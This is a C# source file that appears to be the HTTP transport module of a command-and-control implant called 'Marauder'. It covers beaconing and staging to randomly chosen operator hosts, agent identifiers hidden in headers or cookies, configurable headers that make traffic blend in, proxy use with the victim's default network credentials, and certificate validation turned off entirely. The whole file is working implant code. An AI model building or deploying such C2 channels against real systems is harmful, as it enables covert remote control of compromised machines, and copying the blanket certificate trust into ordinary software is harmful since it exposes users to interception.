
using System;
using System.Collections.Generic;
using System.Net;
using System.Text;

using MarauderHTTP.Common;
using MarauderLib.Services;

namespace MarauderHTTP
{
    public class Webclient
    {
      
        internal static readonly Random Random = new Random();
        private string GetUrl()
        {
            // pick host from list 
            string host = Program.Configuration.Profile.Hosts[Random.Next(Program.Configuration.Profile.Hosts.Count)];
            // pick random url from list
            string url = Program.Configuration.Profile.URLs[Random.Next(Program.Configuration.Profile.URLs.Count)];
            return $"{host}{url}";
        }
        
        private WebClient AddIdentifier(WebClient webClient, string identifier, string stageName = null)
        {
          if (String.IsNullOrEmpty(stageName))
          {
            // Add the AgentName into the request per the Program.Configuration
            if (Program.Configuration.Profile.CheckinIdentifier.Location == "Header")
            {
              webClient.Headers.Add(Program.Configuration.Profile.CheckinIdentifier.Name, identifier);
            }
            else if (Program.Configuration.Profile.CheckinIdentifier.Location == "Cookie")
            {
              webClient.Headers.Add(HttpRequestHeader.Cookie, $"{Program.Configuration.Profile.CheckinIdentifier.Name}={identifier}");
            }
          }
          else
          {
            // Add the StageName into the request per the configuration
            string mergedId = Convert.ToBase64String(Encoding.UTF8.GetBytes($"{stageName}:{identifier}"));
            if (Program.Configuration.Profile.StagingIdentifier.Location == "Header")
            {
              webClient.Headers.Add(Program.Configuration.Profile.StagingIdentifier.Name, mergedId);
            }
            else if (Program.Configuration.Profile.StagingIdentifier.Location == "Cookie")
            {
              webClient.Headers.Add(HttpRequestHeader.Cookie, $"{Program.Configuration.Profile.StagingIdentifier.Name}={mergedId}");
            }
          }
          return webClient;
        }

        private WebClient CreateWebClient(string identifier, string stageName = null)
        {
    #if DEBUG
          Logging.Write("MarauderHTTP",$"Creating Web Client..");
    #endif

          //force Tls 1.1 or Tls 1.2 because Tls 1.0 not works!
          ServicePointManager.SecurityProtocol = (SecurityProtocolType)(0x300 | 0xc00);
          WebClient webClient = new WebClient();

          // add proxy aware webclient settings
          webClient.Proxy = WebRequest.DefaultWebProxy;
          webClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

          // trust self-signed certs
          ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

          foreach (KeyValuePair<string, string> header in Program.Configuration.Profile.Headers)
          {
            webClient.Headers.Add(header.Key, header.Value);
          }

          foreach (KeyValuePair<string, string> cookie in Program.Configuration.Profile.Cookies)
          {
            webClient.Headers.Add(HttpRequestHeader.Cookie, $"{cookie.Key}={cookie.Value}");
          }
          webClient = AddIdentifier(webClient, identifier, stageName);
          return webClient;
        }
        
        public string Stage(string stageName, string stagingId, string message)
        {
    #if DEBUG
          Logging.Write("MarauderHTTP",$"Sending Stage Request. Name: {stageName}, Id: {stagingId}, Message: {message}");
    #endif
          string response = "";

          try
          {
            string beaconUrl = GetUrl();
            // Create a new WebClient object and load the Headers/Cookies per the Client Profile
            WebClient webClient = CreateWebClient(stagingId, stageName);
            string stagingMessage = Message.Render(message);

    #if DEBUG
            Logging.Write("MarauderHTTP",$"Sending POST. URL: {beaconUrl} Message: {stagingMessage}");
    #endif

            string content = webClient.UploadString(beaconUrl, stagingMessage);

            // parse the content based on the "shared" configuration
            response = Message.Extract(content);
          }
          catch (Exception e)
          {
            // We don't want to cause an breaking exception if it fails to connect
    #if DEBUG
            Logging.Write("MarauderHTTP",$"Connection failed: {e.Message}");
    #endif
            response = "ERROR";
          }
          return response;
        }

        public string Beacon(string agentName, string message)
        {
    #if DEBUG
          Logging.Write("MarauderHTTP",$"Beaconing..");
    #endif
          WebClient webClient = CreateWebClient(agentName);
          string beaconUrl = GetUrl();
          string agentMessage = "";

          if (!String.IsNullOrEmpty(message))
          {
            agentMessage = Message.Render(message);
          }
          try
          {
            var content = "";
            if (String.IsNullOrEmpty(agentMessage))
            {
    #if DEBUG
              Logging.Write("MarauderHTTP",$"GETting URL: {beaconUrl}");
    #endif
              content = webClient.DownloadString(beaconUrl);
            }
            else
            {
    #if DEBUG
              Logging.Write("MarauderHTTP",$"POSTing to URL: {beaconUrl}");
    #endif
              content = webClient.UploadString(beaconUrl, agentMessage);
            }

            // parse the content based on the "shared" configuration
            string response = Message.Extract(content);

            return response;
          }
          catch (Exception e)
          {
            // We don't want to cause an breaking exception if it fails to connect
    #if DEBUG
            Logging.Write("MarauderHTTP",$"Connection failed: {e.Message}");
    #endif
            return "ERROR";
          }
        }
        

    }
}